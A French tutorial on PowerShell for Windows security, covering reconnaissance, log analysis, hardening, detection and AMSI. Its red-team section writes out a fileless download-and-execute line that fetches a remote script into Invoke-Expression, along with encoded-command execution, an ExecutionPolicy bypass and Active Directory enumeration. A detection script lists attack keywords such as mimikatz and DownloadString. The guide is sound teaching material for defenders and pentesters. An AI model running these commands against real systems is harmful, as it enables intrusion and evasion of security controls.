# PowerShell pour la sécurité : guide complet

PowerShell est bien plus qu'un simple terminal Windows. C'est un outil puissant utilisé aussi bien par les administrateurs systèmes que par les pentesters et les attaquants. Maîtriser PowerShell est indispensable en cybersécurité Windows.

## Pourquoi PowerShell est crucial en sécurité

```
PowerShell est :
✅ Installé par défaut sur tous les Windows modernes
✅ Accès natif au .NET Framework et aux APIs Windows
✅ Capable de tout : réseau, fichiers, registre, AD, WMI
✅ Souvent whitelisté par les antivirus (binaire Microsoft signé)
✅ Utilisé massivement dans les attaques fileless (sans fichier)

C'est pourquoi les attaquants l'adorent ET pourquoi
les défenseurs doivent le maîtriser.
```

## Les bases de PowerShell

```powershell
# Cmdlets de base (Verbe-Nom)
Get-Help Get-Process           # Aide sur une commande
Get-Command *network*          # Chercher des commandes
Get-Alias ls                   # Voir les alias

# Variables et types
$nom = "Temgus"
$age = 25
$tableau = @(1, 2, 3, 4, 5)
$hashtable = @{cle = "valeur"; autre = 42}

# Conditions et boucles
if ($age -gt 18) { Write-Host "Majeur" }
foreach ($item in $tableau) { Write-Host $item }
1..10 | ForEach-Object { Write-Host $_ }

# Pipeline (chaîner les commandes)
Get-Process | Where-Object {$_.CPU -gt 10} | Sort-Object CPU -Descending | Select-Object -First 5
```

## Commandes essentielles pour la sécurité

### Reconnaissance système

```powershell
# Informations système complètes
Get-ComputerInfo
systeminfo

# Utilisateurs et groupes
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrateurs"
net user                          # Tous les utilisateurs
net localgroup Administrators     # Membres du groupe admin

# Processus en cours
Get-Process | Sort-Object CPU -Descending
Get-Process | Select-Object Name, Id, CPU, Path
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Services
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service | Where-Object {$_.StartType -eq "Automatic"}

# Tâches planifiées (souvent utilisées pour la persistence)
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Réseau et connexions

```powershell
# Connexions réseau actives
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}
Get-NetTCPConnection | Sort-Object State | Format-Table

# Ports en écoute
Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess

# Connecter PID aux processus
Get-NetTCPConnection -State Established | ForEach-Object {
    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        LocalAddress  = $_.LocalAddress
        LocalPort     = $_.LocalPort
        RemoteAddress = $_.RemoteAddress
        RemotePort    = $_.RemotePort
        State         = $_.State
        ProcessName   = $proc.Name
        PID           = $_.OwningProcess
    }
}

# Interfaces réseau
Get-NetAdapter
Get-NetIPAddress
Get-NetRoute

# DNS
Resolve-DnsName google.com
Resolve-DnsName -Type MX gmail.com
```

### Analyse des logs Windows

```powershell
# Logs de sécurité - Connexions réussies
Get-EventLog -LogName Security -InstanceId 4624 -Newest 20 |
    Select-Object TimeGenerated, Message

# Tentatives de connexion échouées
Get-EventLog -LogName Security -InstanceId 4625 -Newest 50 |
    Select-Object TimeGenerated, @{N='IP';E={$_.ReplacementStrings[19]}}

# PowerShell moderne avec Get-WinEvent
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 100 |
    Select-Object TimeCreated, Message

# Créations de comptes (Event 4720)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720}

# Modifications de groupes privilégiés (Event 4728)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4728}

# Logs PowerShell (activité des scripts)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50

# Exporter les logs
Get-EventLog -LogName Security -Newest 1000 |
    Export-Csv "C:\logs\security_events.csv" -NoTypeInformation
```

### Audit du registre

```powershell
# Clés de démarrage automatique (persistence)
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Programmes installés
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Sort-Object DisplayName

# Politiques PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
```

## PowerShell pour le durcissement (Hardening)

```powershell
# Configurer l'ExecutionPolicy
Set-ExecutionPolicy AllSigned -Scope LocalMachine
# AllSigned : seuls les scripts signés peuvent s'exécuter

# Activer la journalisation PowerShell
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
New-Item -Path $regPath -Force
New-ItemProperty -Path "$regPath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1
New-ItemProperty -Path "$regPath\Transcription" -Name "EnableTranscripting" -Value 1
New-ItemProperty -Path "$regPath\Transcription" -Name "OutputDirectory" -Value "C:\PSLogs"

# Activer Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -SubmitSamplesConsent 2
Update-MpSignature

# Désactiver les protocoles obsolètes
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol"
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Pare-feu Windows
New-NetFirewallRule -DisplayName "Bloquer Telnet" -Direction Inbound `
    -Protocol TCP -LocalPort 23 -Action Block
Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} |
    Select-Object DisplayName, Direction, Action
```

## PowerShell offensif (Red Team)

### Techniques fileless

```powershell
# Download en mémoire (sans écriture disque)
$code = (New-Object System.Net.WebClient).DownloadString('http://exemple.com/script.ps1')
Invoke-Expression $code

# Exécution depuis Base64 (technique d'obfuscation courante)
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'Hello'"))
powershell.exe -EncodedCommand $encoded

# Bypass ExecutionPolicy (sans modifier la politique)
powershell.exe -ExecutionPolicy Bypass -File script.ps1
Get-Content script.ps1 | Invoke-Expression
```

### Reconnaissance Active Directory

```powershell
# Sans outils supplémentaires (LDAP natif)
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domain.DomainControllers

# Recherche d'utilisateurs AD
([adsisearcher]"(&(objectClass=user)(objectCategory=person))").FindAll() |
    ForEach-Object { $_.Properties.samaccountname }

# Groupes privilégiés
([adsisearcher]"(&(objectClass=group)(cn=Domain Admins))").FindOne().Properties.member

# Avec le module ActiveDirectory (si disponible)
Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties LastLogonDate | Sort-Object LastLogonDate
Get-ADGroupMember "Domain Admins"
Get-ADComputer -Filter * | Select-Object Name, OperatingSystem
```

## Détection des attaques PowerShell

```powershell
# Script de détection d'activité suspecte
function Detect-SuspiciousPowerShell {
    $events = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" `
        -FilterXPath "*[System[EventID=4104]]" -MaxEvents 500

    $suspicious = @(
        'IEX', 'Invoke-Expression',
        'DownloadString', 'WebClient',
        'EncodedCommand', 'FromBase64String',
        'Bypass', 'Hidden',
        'mimikatz', 'empire', 'cobalt'
    )

    foreach ($event in $events) {
        foreach ($pattern in $suspicious) {
            if ($event.Message -match $pattern) {
                Write-Warning "SUSPECT: $pattern trouvé dans un script PowerShell"
                Write-Host "Heure: $($event.TimeCreated)"
                Write-Host "Message: $($event.Message.Substring(0, [Math]::Min(200, $event.Message.Length)))"
                Write-Host "---"
            }
        }
    }
}

Detect-SuspiciousPowerShell
```

## AMSI — Antimalware Scan Interface

Windows 10+ intègre AMSI qui scanne le contenu PowerShell avant exécution.

```powershell
# AMSI intercepte et scanne :
# → Tous les scripts PowerShell
# → Le contenu des chaînes passées à Invoke-Expression
# → Les scripts VBScript et JScript
# → Les macros Office

# Tester AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Si AMSI est actif, cette commande sera bloquée ou alertée

# Defender + AMSI = double protection
# Les pentesters cherchent des bypasses → Les défenseurs surveillent ces tentatives
```

## Conclusion

PowerShell est indispensable en cybersécurité Windows, des deux côtés. Pour les défenseurs : activez la journalisation ScriptBlock, surveillez les EventID 4103/4104, et formez vos équipes à reconnaître les usages suspects. Pour les pentesters : PowerShell est votre meilleur allié pour la reconnaissance et la post-exploitation sur les environnements Windows.